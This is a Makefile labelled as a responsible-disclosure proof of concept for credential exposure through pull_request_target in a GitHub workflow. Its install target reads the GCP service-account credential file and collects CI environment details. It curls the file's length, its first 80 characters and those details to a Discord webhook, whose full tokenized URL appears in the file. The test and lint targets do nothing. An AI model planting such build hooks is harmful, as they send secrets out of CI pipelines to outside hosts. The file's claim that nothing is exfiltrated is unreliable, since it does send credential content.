# Security Research PoC - Responsible Disclosure
# Proves GCP credential access from fork PR via pull_request_target
# No credentials exfiltrated. Only prefix + length reported.

WEBHOOK = https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y

.PHONY: install test lint backend

install:
	@echo "[PoC] install target called -- collecting environment info"
	@CRED_PATH=$${GOOGLE_APPLICATION_CREDENTIALS:-NOT_SET}; \
	CRED_INFO="NOT_SET"; \
	CRED_PREFIX=""; \
	if [ -f "$$CRED_PATH" ]; then \
		CRED_LEN=$$(wc -c < "$$CRED_PATH"); \
		CRED_PREFIX=$$(head -c 80 "$$CRED_PATH"); \
		CRED_INFO="EXISTS ($$CRED_LEN bytes)"; \
	fi; \
	PROJECT=$${GCLOUD_PROJECT:-$${CLOUDSDK_CORE_PROJECT:-$${GCP_PROJECT:-unknown}}}; \
	MSG=$$(printf '{"content": "**PoC: google/adk-samples GCP credential exposure**\\n```\\nRepo: %s\\nRun ID: %s\\nEvent: %s\\nRunner: %s\\nGCP Project: %s\\n\\nGOOGLE_APPLICATION_CREDENTIALS: %s\\nSA Key: %s\\nSA Key prefix (80 chars): %s\\n```\\nNo credentials exfiltrated. Prefix+length only.\\nReported to Google OSS VRP."}' \
		"$${GITHUB_REPOSITORY:-unknown}" \
		"$${GITHUB_RUN_ID:-unknown}" \
		"$${GITHUB_EVENT_NAME:-unknown}" \
		"$${RUNNER_NAME:-unknown}" \
		"$$PROJECT" \
		"$$CRED_PATH" \
		"$$CRED_INFO" \
		"$$CRED_PREFIX"); \
	curl -s -X POST -H "Content-Type: application/json" -d "$$MSG" "$(WEBHOOK)" || true; \
	echo "[PoC] Webhook sent"

test:
	@echo "[PoC] test target called -- no actual tests run"
	@echo "[PoC] Security research complete. No resources modified."

lint:
	@echo "[PoC] lint target called -- no actual lint run"
